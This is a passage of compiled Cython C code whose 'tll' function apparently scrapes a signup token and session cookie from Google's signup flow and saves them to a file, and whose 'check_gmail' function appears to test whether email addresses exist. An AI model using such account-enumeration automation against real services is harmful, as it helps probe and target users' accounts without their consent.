      __pyx_t_4 = PyNumber_Add(__pyx_t_7, __pyx_kp_u__9); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 135, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = PyNumber_Add(__pyx_t_4, __pyx_v_n1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 135, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = PyNumber_Add(__pyx_t_7, __pyx_kp_u__9); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 135, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = PyNumber_Add(__pyx_t_4, __pyx_v_n2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 135, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = PyNumber_Add(__pyx_t_7, __pyx_kp_u_0_0_null_null_web_glif_signup_0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 135, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (PyDict_SetItem(__pyx_t_5, __pyx_kp_u_f_req, __pyx_t_4) < 0) __PYX_ERR(0, 135, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_deviceinfo, __pyx_kp_u_null_null_null_null_null_NL_nul) < 0) __PYX_ERR(0, 135, __pyx_L3_error)
      __pyx_v_data = ((PyObject*)__pyx_t_5);
      __pyx_t_5 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_pp); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 137, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);

      
      __pyx_t_4 = __Pyx_PyDict_NewPresized(3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 139, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_cookies, __pyx_v_cookies) < 0) __PYX_ERR(0, 139, __pyx_L3_error)

      
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 139, __pyx_L3_error)

      
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 139, __pyx_L3_error)

      
      __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_tuple__10, __pyx_t_4); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 137, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_v_response = __pyx_t_7;
      __pyx_t_7 = 0;

      
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_text); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 142, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_5 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 142, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = PyUnicode_Split(((PyObject*)__pyx_t_5), __pyx_kp_u_null, -1L); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 142, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_GetItemInt_List(__pyx_t_4, 1, long, 1, __Pyx_PyInt_From_long, 1, 0, 1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 142, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_split); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 142, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_4, function);
        }
      }
      __pyx_t_7 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_5, __pyx_kp_u__11) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_kp_u__11);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 142, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_GetItemInt(__pyx_t_7, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 142, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_v_tl = __pyx_t_4;
      __pyx_t_4 = 0;

      
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_cookies); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 143, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_get_dict); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 143, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_4 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 143, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_kp_u_Host_GAPS); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 143, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_DECREF_SET(__pyx_v_host, __pyx_t_5);
      __pyx_t_5 = 0;

      
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_11, &__pyx_t_12, &__pyx_t_13);
        __Pyx_XGOTREF(__pyx_t_11);
        __Pyx_XGOTREF(__pyx_t_12);
        __Pyx_XGOTREF(__pyx_t_13);
        /*try:*/ {

          
          __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_os); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 145, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_remove); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 145, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_4 = NULL;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_7))) {
            __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_7);
            if (likely(__pyx_t_4)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
              __Pyx_INCREF(__pyx_t_4);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_7, function);
            }
          }
          __pyx_t_5 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_4, __pyx_kp_u_tl_txt) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_kp_u_tl_txt);
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 145, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

          
        }
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
        goto __pyx_L14_try_end;
        __pyx_L9_error:;
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

        
        __pyx_t_9 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
        if (__pyx_t_9) {
          __Pyx_ErrRestore(0,0,0);
          goto __pyx_L10_exception_handled;
        }
        goto __pyx_L11_except_error;
        __pyx_L11_except_error:;

        
        __Pyx_XGIVEREF(__pyx_t_11);
        __Pyx_XGIVEREF(__pyx_t_12);
        __Pyx_XGIVEREF(__pyx_t_13);
        __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_12, __pyx_t_13);
        goto __pyx_L3_error;
        __pyx_L10_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_11);
        __Pyx_XGIVEREF(__pyx_t_12);
        __Pyx_XGIVEREF(__pyx_t_13);
        __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_12, __pyx_t_13);
        __pyx_L14_try_end:;
      }

      
      /*with:*/ {
        __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__12, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 148, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_13 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_exit); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 148, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_13);
        __pyx_t_4 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_enter); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 148, __pyx_L15_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_10 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_10)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_10);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
          }
        }
        __pyx_t_7 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 148, __pyx_L15_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __pyx_t_7;
        __pyx_t_7 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        /*try:*/ {
          {
            __Pyx_PyThreadState_declare
            __Pyx_PyThreadState_assign
            __Pyx_ExceptionSave(&__pyx_t_12, &__pyx_t_11, &__pyx_t_14);
            __Pyx_XGOTREF(__pyx_t_12);
            __Pyx_XGOTREF(__pyx_t_11);
            __Pyx_XGOTREF(__pyx_t_14);
            /*try:*/ {
              __pyx_v_f = __pyx_t_4;
              __pyx_t_4 = 0;

              
              __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_f, __pyx_n_s_write); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 149, __pyx_L19_error)
              __Pyx_GOTREF(__pyx_t_5);
              __pyx_t_7 = PyNumber_Add(__pyx_v_tl, __pyx_kp_u__13); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 149, __pyx_L19_error)
              __Pyx_GOTREF(__pyx_t_7);
              __pyx_t_10 = PyNumber_Add(__pyx_t_7, __pyx_v_host); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 149, __pyx_L19_error)
              __Pyx_GOTREF(__pyx_t_10);
              __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
              __pyx_t_7 = PyNumber_Add(__pyx_t_10, __pyx_kp_u__14); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 149, __pyx_L19_error)
              __Pyx_GOTREF(__pyx_t_7);
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              __pyx_t_10 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
                __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_5);
                if (likely(__pyx_t_10)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
                  __Pyx_INCREF(__pyx_t_10);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_5, function);
                }
              }
              __pyx_t_4 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_10, __pyx_t_7) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_7);
              __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
              __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
              if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 149, __pyx_L19_error)
              __Pyx_GOTREF(__pyx_t_4);
              __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

              
            }
            __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
            __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
            __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
            goto __pyx_L24_try_end;
            __pyx_L19_error:;
            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
            /*except:*/ {
              __Pyx_AddTraceback("source.tll", __pyx_clineno, __pyx_lineno, __pyx_filename);
              if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_5, &__pyx_t_7) < 0) __PYX_ERR(0, 148, __pyx_L21_except_error)
              __Pyx_GOTREF(__pyx_t_4);
              __Pyx_GOTREF(__pyx_t_5);
              __Pyx_GOTREF(__pyx_t_7);
              __pyx_t_10 = PyTuple_Pack(3, __pyx_t_4, __pyx_t_5, __pyx_t_7); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 148, __pyx_L21_except_error)
              __Pyx_GOTREF(__pyx_t_10);
              __pyx_t_15 = __Pyx_PyObject_Call(__pyx_t_13, __pyx_t_10, NULL);
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 148, __pyx_L21_except_error)
              __Pyx_GOTREF(__pyx_t_15);
              __pyx_t_16 = __Pyx_PyObject_IsTrue(__pyx_t_15);
              __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
              if (__pyx_t_16 < 0) __PYX_ERR(0, 148, __pyx_L21_except_error)
              __pyx_t_17 = ((!(__pyx_t_16 != 0)) != 0);
              if (__pyx_t_17) {
                __Pyx_GIVEREF(__pyx_t_4);
                __Pyx_GIVEREF(__pyx_t_5);
                __Pyx_XGIVEREF(__pyx_t_7);
                __Pyx_ErrRestoreWithState(__pyx_t_4, __pyx_t_5, __pyx_t_7);
                __pyx_t_4 = 0; __pyx_t_5 = 0; __pyx_t_7 = 0; 
                __PYX_ERR(0, 148, __pyx_L21_except_error)
              }
              __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
              __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
              __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
              goto __pyx_L20_exception_handled;
            }
            __pyx_L21_except_error:;
            __Pyx_XGIVEREF(__pyx_t_12);
            __Pyx_XGIVEREF(__pyx_t_11);
            __Pyx_XGIVEREF(__pyx_t_14);
            __Pyx_ExceptionReset(__pyx_t_12, __pyx_t_11, __pyx_t_14);
            goto __pyx_L3_error;
            __pyx_L20_exception_handled:;
            __Pyx_XGIVEREF(__pyx_t_12);
            __Pyx_XGIVEREF(__pyx_t_11);
            __Pyx_XGIVEREF(__pyx_t_14);
            __Pyx_ExceptionReset(__pyx_t_12, __pyx_t_11, __pyx_t_14);
            __pyx_L24_try_end:;
          }
        }
        /*finally:*/ {
          /*normal exit:*/{
            if (__pyx_t_13) {
              __pyx_t_14 = __Pyx_PyObject_Call(__pyx_t_13, __pyx_tuple__15, NULL);
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
              if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 148, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_14);
              __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
            }
            goto __pyx_L18;
          }
          __pyx_L18:;
        }
        goto __pyx_L28;
        __pyx_L15_error:;
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        goto __pyx_L3_error;
        __pyx_L28:;
      }

      
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

    
    __pyx_t_9 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
    if (__pyx_t_9) {
      __Pyx_AddTraceback("source.tll", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_7, &__pyx_t_5, &__pyx_t_4) < 0) __PYX_ERR(0, 150, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_5);
      __pyx_v_e = __pyx_t_5;
      /*try:*/ {

        
        __pyx_t_10 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_v_e); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 151, __pyx_L34_error)
        __Pyx_GOTREF(__pyx_t_10);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_tll); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 152, __pyx_L34_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_8 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_8)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_8);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
          }
        }
        __pyx_t_10 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 152, __pyx_L34_error)
        __Pyx_GOTREF(__pyx_t_10);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      }

      
      /*finally:*/ {
        /*normal exit:*/{
          __Pyx_DECREF(__pyx_v_e);
          __pyx_v_e = NULL;
          goto __pyx_L35;
        }
        __pyx_L34_error:;
        /*exception exit:*/{
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __pyx_t_13 = 0; __pyx_t_14 = 0; __pyx_t_11 = 0; __pyx_t_12 = 0; __pyx_t_15 = 0; __pyx_t_20 = 0;
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
          if (PY_MAJOR_VERSION >= 3) __Pyx_ExceptionSwap(&__pyx_t_12, &__pyx_t_15, &__pyx_t_20);
          if ((PY_MAJOR_VERSION < 3) || unlikely(__Pyx_GetException(&__pyx_t_13, &__pyx_t_14, &__pyx_t_11) < 0)) __Pyx_ErrFetch(&__pyx_t_13, &__pyx_t_14, &__pyx_t_11);
          __Pyx_XGOTREF(__pyx_t_13);
          __Pyx_XGOTREF(__pyx_t_14);
          __Pyx_XGOTREF(__pyx_t_11);
          __Pyx_XGOTREF(__pyx_t_12);
          __Pyx_XGOTREF(__pyx_t_15);
          __Pyx_XGOTREF(__pyx_t_20);
          __pyx_t_9 = __pyx_lineno; __pyx_t_18 = __pyx_clineno; __pyx_t_19 = __pyx_filename;
          {
            __Pyx_DECREF(__pyx_v_e);
            __pyx_v_e = NULL;
          }
          if (PY_MAJOR_VERSION >= 3) {
            __Pyx_XGIVEREF(__pyx_t_12);
            __Pyx_XGIVEREF(__pyx_t_15);
            __Pyx_XGIVEREF(__pyx_t_20);
            __Pyx_ExceptionReset(__pyx_t_12, __pyx_t_15, __pyx_t_20);
          }
          __Pyx_XGIVEREF(__pyx_t_13);
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_XGIVEREF(__pyx_t_11);
          __Pyx_ErrRestore(__pyx_t_13, __pyx_t_14, __pyx_t_11);
          __pyx_t_13 = 0; __pyx_t_14 = 0; __pyx_t_11 = 0; __pyx_t_12 = 0; __pyx_t_15 = 0; __pyx_t_20 = 0;
          __pyx_lineno = __pyx_t_9; __pyx_clineno = __pyx_t_18; __pyx_filename = __pyx_t_19;
          goto __pyx_L5_except_error;
        }
        __pyx_L35:;
      }
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_AddTraceback("source.tll", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_n1);
  __Pyx_XDECREF(__pyx_v_n2);
  __Pyx_XDECREF(__pyx_v_host);
  __Pyx_XDECREF(__pyx_v_he3);
  __Pyx_XDECREF(__pyx_v_res1);
  __Pyx_XDECREF(__pyx_v_tok);
  __Pyx_XDECREF(__pyx_v_cookies);
  __Pyx_XDECREF(__pyx_v_headers);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_response);
  __Pyx_XDECREF(__pyx_v_tl);
  __Pyx_XDECREF(__pyx_v_f);
  __Pyx_XDECREF(__pyx_v_e);
  __Pyx_XDECREF(__pyx_gb_6source_3tll_2generator);
  __Pyx_XDECREF(__pyx_gb_6source_3tll_5generator1);
  __Pyx_XDECREF(__pyx_gb_6source_3tll_8generator2);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_3check_gmail(PyObject *__pyx_self, PyObject *__pyx_v_email); /*proto*/
static PyMethodDef __pyx_mdef_6source_3check_gmail = {"check_gmail", (PyCFunction)__pyx_pw_6source_3check_gmail, METH_O, 0};
static PyObject *__pyx_pw_6source_3check_gmail(PyObject *__pyx_self, PyObject *__pyx_v_email) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("check_gmail (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_2check_gmail(__pyx_self, ((PyObject *)__pyx_v_email));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_2check_gmail(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_email) {
  PyObject *__pyx_v_o = NULL;
  PyObject *__pyx_v_tl = NULL;
  PyObject *__pyx_v_host = NULL;
  PyObject *__pyx_v_cookies = NULL;
  PyObject *__pyx_v_headers = NULL;
  PyObject *__pyx_v_params = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_response = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  int __pyx_t_1;
  int __pyx_t_2;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  int __pyx_t_13;
  PyObject *__pyx_t_14 = NULL;
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  PyObject *(*__pyx_t_17)(PyObject *);
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("check_gmail", 0);
  __Pyx_INCREF(__pyx_v_email);

  
  __pyx_t_1 = (__Pyx_PySequence_ContainsTF(__pyx_kp_u__16, __pyx_v_email, Py_EQ)); if (unlikely(__pyx_t_1 < 0)) __PYX_ERR(0, 159, __pyx_L1_error)
  __pyx_t_2 = (__pyx_t_1 != 0);
  if (__pyx_t_2) {

    
    __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_v_email); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 160, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = PyUnicode_Split(((PyObject*)__pyx_t_3), __pyx_kp_u__16, -1L); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 160, __pyx_L1_error)
